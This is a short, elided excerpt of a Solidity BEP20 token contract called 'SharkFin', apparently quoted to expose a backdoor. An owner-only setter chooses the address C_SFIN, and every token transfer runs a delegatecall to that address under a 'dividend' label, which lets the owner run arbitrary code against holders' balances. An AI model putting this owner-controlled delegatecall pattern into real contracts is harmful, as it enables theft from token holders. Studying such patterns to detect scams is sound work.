...
contract SharkFin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'SharkFin';
  ...
  */
  ...
  function claimDividendSFIN(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_SFIN.delegatecall(
  ...
  function SetBonusSFIN(address c) public onlyOwner {
    C_SFIN = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendSFIN(sender, recipient, amount);   
